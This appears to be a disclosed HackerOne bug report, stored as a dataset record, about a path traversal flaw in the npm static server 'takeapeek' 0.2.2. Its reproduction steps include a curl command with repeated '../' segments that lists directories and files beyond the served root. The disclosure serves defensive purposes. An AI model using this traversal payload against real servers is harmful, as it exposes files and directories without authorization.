---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '403736'
original_report_id: '403736'
title: '[takeapeek] Path traversal allow to expose directory and files'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2018-09-01T05:13:41.721Z'
disclosed_at: '2018-11-02T10:37:18.721Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: takeapeek
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [takeapeek] Path traversal allow to expose directory and files

## Metadata

- HackerOne Report ID: 403736
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2018-11-02T10:37:18.721Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Path Travelsal in takeapeek
It allows attacker to list directory and files.

# Module

**module name:** takeapeek
**version:** 0.2.2
**npm page:** `https://www.npmjs.com/package/takeapeek`

## Module Description

A simple static webserver with only one command. Heavily inspired by glance, this is really more of a learning experience then anything.

## Module Stats

~100 downloads per month 

# Vulnerability

## Vulnerability Description

Attacker was able to exploit path traversal and view sensitive directory and files.

## Steps To Reproduce:

- `npm i takeapeek`
- `node node_modules/takeapeek/dist/bin.js`
- `curl --path-as-is http://localhost:3141/../../../../../../`

F340897


## Supporting Material/References:

- OS: Windows 10
- NODE: v10.8.0
- NPM : 6.2.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows attacker to list directory and files.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
